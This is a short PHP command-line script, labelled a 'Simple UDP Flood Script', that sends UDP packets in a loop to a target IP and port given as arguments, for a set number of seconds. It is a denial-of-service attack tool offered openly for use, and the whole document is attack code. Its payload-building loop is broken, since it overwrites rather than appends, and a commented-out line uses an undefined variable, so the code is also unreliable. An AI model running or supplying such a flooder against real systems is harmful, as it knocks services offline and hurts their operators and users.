<?php

// Simple UDP Flood Script

// Usage: php udp_flood.php -ip <target_ip> -port <target_port> -time <duration_in_seconds>

// Get command line arguments
$arguments = $argv;

// Remove the script name from the arguments array
array_shift($arguments);

// Parse the arguments
$ipIndex = array_search('-ip', $arguments);
$ipValue = $arguments[$ipIndex + 1];

$portIndex = array_search('-port', $arguments);
$portValue = $arguments[$portIndex + 1];

$timeIndex = array_search('-time', $arguments);
$timeValue = $arguments[$timeIndex + 1];

// Convert time to seconds
$time = $timeValue;
$host = $ipValue;
$port = $portValue;

$get_time = time();

$max_time = $get_time + $time;

for($i= 0; $i < 65000; $i++) {

    $out = 'X';

}

while (True) {

    if (time() > $max_time) {
        
        break;
        
    }

    $fp_udp = fsockopen('udp://' . $host, $port, $errno, $errstr, 5);

    //echo("UDP Flood - Completed with $packets (" . round(($packets * 65) / 1024, 2) . " MB) packets averaging " . round($packets / $time, 2) . " packets per second\n");

    if ($fp_udp) {
        
        fwrite($fp_udp, $out);
        fclose($fp_udp);
        
    }
    
}

print("Ended: " . date('d-m-y h:i:s'));

?>
